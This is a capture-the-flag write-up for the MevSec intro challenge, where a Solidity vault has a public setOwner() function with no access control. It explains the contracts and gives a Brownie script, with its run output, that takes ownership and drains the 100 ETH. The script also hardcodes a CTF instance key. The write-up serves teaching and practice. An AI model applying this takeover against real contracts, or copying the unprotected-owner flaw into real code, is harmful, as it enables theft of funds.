# Intro-YouTube & Blog DONE

## Challenge

- https://ctf.mevsec.com/challenges#Intro%20-%20YouTube%20&%20Blog-8

This challenge is an introduction and the writeup is available here on youtube => Writeup: MevSecurity This will explain how the MevSec CTF works and introduce the community.

- To start the challenge please use :

  - curl 'http://5.196.27.132:8080/create_challenge?challenge_number=0'

- To check all the available commands use :

  - curl http://5.196.27.132:8080/

  The challenge will be solved when there are no funds left inside the wallet. Hope you will join us!

Good luck with the bearmarket!

Creator: Ethnical#0954

# Solution

- Put the `Setup.sol` & `VideoChalllengeIntro.sol` in the `contracts` folder.

- Follow the steps shown in the [README.md](../README.md) file of the project.

- Now in the project setup you will see these `scripts`

```js
scripts
├── deploy.py
├── get_data.py
├── hack.py
├── helpful_scripts.py
└── submit.py
```

- `deploy.py` will help to deploy the contracts locally for testing.

- You can ignore the `get_data.py` script as I was trying to automate the curl process but don't know why it was not working

- `hack.py` will solve the challenge

- `helpful_scripts.py` contains the helper scripts

- `submit.py` will submit the instance for the challenge

# Explanation

- We have 2 contracts `Setup.sol` & `VideoChalllengeIntro.sol`. For all of the challenges, this is the general setup. We will get the Stetup contract address & from that we have to read the challenge contract from the `Storage` of the `Setup` contract.

- `Setup.sol`

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
import "./VideoChalllengeIntro.sol";

contract Setup {
    VideoChallengeIntro public vci;

    constructor() payable {
        require(msg.value >= 100, "Not enough ETH to create the challenge..");
        vci = (new VideoChallengeIntro){ value: 100 ether }();
    }

    function isSolved() public view returns (bool) {
        return address(vci).balance == 0;
    }
}
```

1.  `pragma solidity 0.8.0;`: This specifies the version of Solidity being used for the contract. In this case, version 0.8.0 is used.
2.  `import "./VideoChalllengeIntro.sol";`: This imports a Solidity contract named "VideoChallengeIntro.sol" from a file located in the same directory with the contract being defined.
3.  `contract Setup { ... }`: This defines a new Solidity contract named "Setup".
4.  `VideoChallengeIntro public vci;`: This declares a public state variable of type "VideoChallengeIntro" named "vci", which represents an instance of the "VideoChallengeIntro" contract.
5.  `constructor() payable { ... }`: This is the constructor function of the "Setup" contract. It is called when the contract is deployed to the Ethereum network. It is marked as "payable", which means it can receive Ether (ETH) as part of the deployment process. The function requires that the amount of ETH sent during deployment is greater than or equal to 100, otherwise, it will revert with an error message.
6.  `vci = (new VideoChallengeIntro){ value: 100 ether }();`: Inside the constructor, a new instance of the "VideoChallengeIntro" contract is created using the "new" keyword. The "value" field is set to 100 ether, which means 100 ETH is sent to the "VideoChallengeIntro" contract as part of the deployment process. The resulting contract instance is assigned to the "vci" state variable.
7.  `function isSolved() public view returns (bool) { ... }`: This is a public view function that returns a boolean value indicating whether the "VideoChallengeIntro" contract has been solved. It checks the balance of the "vci" contract, and if it is 0, it returns true, indicating that the challenge has been solved.

- To solve the challenge we have to make this condition `address(vci).balance == 0` `true`, i.e. we have to withdraw the funds from the `VideoChallengeIntro` contract. How can we do that?

- Let's look at the `VideoChallengeIntro` contract

```js
//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.0;

//The VaultMEVSec contains 100ETH could you succeed to steal them?
contract VideoChallengeIntro {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor() payable {
        require(
            msg.value == 100 ether,
            "100ETH required for the start the challenge"
        );
        owner = msg.sender; // Set the Owner when we call the constructor
    }

    function balance() public view returns (uint256) {
        //Return the Balance of the contract.
        return address(this).balance;
    }

    function withdraw() public onlyOwner {
        //Only the owner can withdraw the contract balance.
        payable(owner).transfer(address(this).balance); // Transfer the balance to the owner
    }

    function setOwner() public {
        //Set the owner of the contract.
        owner = msg.sender;
    }
}

```

1.  `//SPDX-License-Identifier: Unlicense`: This indicates the license for the contract. In this case, it is marked as "Unlicense", which means the contract is released into the public domain.
2.  `pragma solidity 0.8.0;`: This specifies the version of Solidity being used for the contract. In this case, version 0.8.0 is used.
3.  `contract VideoChallengeIntro { ... }`: This defines a new Solidity contract named "VideoChallengeIntro".
4.  `address public owner;`: This declares a public state variable of type "address" named "owner", which represents the address of the owner of the contract.
5.  `modifier onlyOwner() { ... }`: This defines a custom modifier named "onlyOwner", which can be used to restrict access to certain functions or operations to the owner of the contract. The modifier requires that the caller of the function is the same as the "owner" address, otherwise it will revert with an error.
6.  `constructor() payable { ... }`: This is the constructor function of the "VideoChallengeIntro" contract. It is called when the contract is deployed to the Ethereum network. It is marked as "payable", which means it can receive Ether (ETH) as part of the deployment process. The function requires that the amount of ETH sent during deployment is exactly 100 ether, otherwise it will revert with an error message. The "owner" state variable is set to the address of the caller, which becomes the owner of the contract.
7.  `function balance() public view returns (uint256) { ... }`: This is a public view function that returns the balance of the contract in wei, which is the smallest unit of Ether.
8.  `function withdraw() public onlyOwner { ... }`: This is a public function that allows the owner of the contract to withdraw the entire balance of the contract. It is marked with the "onlyOwner" modifier, which restricts access to only the owner of the contract. The "payable(owner).transfer(address(this).balance);" statement transfers the balance of the contract to the owner's address.
9.  `function setOwner() public { ... }`: This is a public function that allows anyone to set the owner of the contract. It simply sets the "owner" state variable to the address of the caller.

- So to solve this we have to call the `withdraw` function. But there is we have to pass the `onlyOwner` modifier. It means only the owner of the contract can withdraw the funds.

- If we look further there is function called `setOwner()` which is public, i.e. anyone can call it & the caller will be set to owner.

```js
 function setOwner() public {
        //Set the owner of the contract.
        owner = msg.sender;
    }
```

- So to solve the challenge we just have to call the `setOwner` function first then we can withdraw the fund by calling the `withdraw` function.

- That's what we are doing here in `hack.py` script

```py
#!/usr/bin/python3
from brownie import web3, VideoChallengeIntro, Setup, network
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from scripts.get_data import get_values
from scripts.submit import submit
from colorama import Fore
from subprocess import run

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{solved}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")

def hack(netwrk=False):
    # print(network)
    if netwrk != "mevsec":
        setup, _ = deploy()
        _, attacker = get_account()
    else:
        # RPC_URL, SETUP, PRIVATE_KEY, FLAG_ID = get_values()

        RPC_URL, SETUP, PRIVATE_KEY, FLAG_ID = (
            "http://ctf.mevsec.com:50662",
            "0x876807312079af775c49c916856A2D65f904e612",
            0xEDBC6D1A8360D0C02D4063CDD0A23B55C469C90D3CFBC2C88A015F9DD92D22B3,
            "e935b4c4545a1fb3cc6da0ef59a00f313d95e304c5ce1fe088ec52dcd9ff8c74",
        )

        try:
            run(
                [
                    "brownie",
                    "networks",
                    "modify",
                    "mevsec",
                    f"host={RPC_URL}",
                ],
                check=True,
            )
        except:
            print("OPPS!!")
            exit(-1)

        # print(Setup)
        # print(type(Setup))
        # exit()
        setup = Setup.at(f"{SETUP}")
        attacker = get_account()

    print_colour(setup.isSolved())

    # ? get the address of the target contract
    vci_contract = VideoChallengeIntro.at(setup.vci.call())
    # print(target.vci.call())

    print(
        f"{magenta}Contract balance: {green}{web3.fromWei(vci_contract.balance({'from': attacker}), 'ether')} ETH{reset}"
    )
    # print(dir(vci_contract))

    vci_contract.setOwner({"from": attacker, "gas_limit": 200000}).wait(1)
    vci_contract.withdraw({"from": attacker, "gas_limit": 200000}).wait(1)

    print(
        f"{magenta}Contract balance: {green}{web3.fromWei(vci_contract.balance({'from': attacker}), 'ether')} ETH{reset}"
    )
    print_colour(setup.isSolved())

    assert setup.isSolved() == True

    if netwrk == "mevsec":
        # now sublit & get the points
        submit(FLAG_ID)

def main():
    netwrk = network.show_active()
    # print(netwrk)

    if netwrk == "mevsec":
        hack(netwrk)
    else:
        hack()

if __name__ == "__main__":
    main()

```

- You can just ignore pretty much everything. The import part is from here

```py
# imports

[...]
    setup = Setup.at(f"{SETUP}")
    attacker = get_account()
[...]
```

- These are brownie syntax from setting up a contract from its address & we are getting the attacker account from the `get_account()` function which is in the `helpful_scripts.py` file.

- Next this is how we are reading the storage of the `Setup` contract & getting the address of the `VideoChallengeIntro` contract so that we can interact with it & using the same method as above we are making a contract container object to interact with it.

```py
[...]
# ? get the address of the target contract
    vci_contract = VideoChallengeIntro.at(setup.vci.call())
[...]
```

- Next we are setting the owner this is the brownie syntax to specify from where the transaction is coming & we are setting a "gas_limit" because of the `RPC` requirement. Then we are calling the `withdraw()` funtion to drain the contract & steal the funds.

```py
[...]
vci_contract.setOwner({"from": attacker, "gas_limit": 200000}).wait(1)
vci_contract.withdraw({"from": attacker, "gas_limit": 200000}).wait(1)
[...]
```

- That's pretty much it. The rest of the unexplained code is for just show-off & pretty printing purposes.

### Solve

- Run locally by running

```js
brownie run scripts/hack.py

Brownie v1.19.3 - Python development framework for Ethereum

IntroYoutubeBlogDoneProject is the active project.

Launching 'ganache-cli --chain.vmErrorsOnRPCResponse true --wallet.totalAccounts 10 --hardfork istanbul --fork.url https://eth-mainnet.alchemyapi.io/v2/<API_KEY> --miner.blockGasLimit 12000000 --wallet.mnemonic brownie --server.port 8545 --chain.chainId 1'...

Running 'scripts/hack.py::main'...
Transaction sent: 0xb5772d6085a22a3276868343b64d84d48247895516aa538a24c1f15b60ab9f97
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 10
  Setup.constructor confirmed   Block: 17112229   Gas used: 256115 (2.13%)
  Setup deployed at: 0xb6286fAFd0451320ad6A8143089b216C2152c025

Is complete: False
Contract balance: 100 ETH
Transaction sent: 0x2874f1e3386af4a59d72fc258fa4c39bb36dd3cfc3831e9386ceebddb030c758
  Gas price: 0.0 gwei   Gas limit: 200000   Nonce: 5
  VideoChallengeIntro.setOwner confirmed   Block: 17112230   Gas used: 27043 (13.52%)

  VideoChallengeIntro.setOwner confirmed   Block: 17112230   Gas used: 27043 (13.52%)

Transaction sent: 0xde664d5411ed9b55d6579ad9bd11b824b84e87ea77fb238978acffb64e4c1e60
  Gas price: 0.0 gwei   Gas limit: 200000   Nonce: 6
  VideoChallengeIntro.withdraw confirmed   Block: 17112231   Gas used: 30347 (15.17%)

  VideoChallengeIntro.withdraw confirmed   Block: 17112231   Gas used: 30347 (15.17%)

Contract balance: 0 ETH
Is complete: True
Terminating local RPC client...
```

- Now sovle the first challenge by running

```py
brownie run scripts/hack.py --network mevsec
```

# Video Solution

**Coming Soon**

[Subscribe & Stay tuned](https://www.youtube.com/channel/UCQaHnWYnAo-e7YA5T3htj2Q)
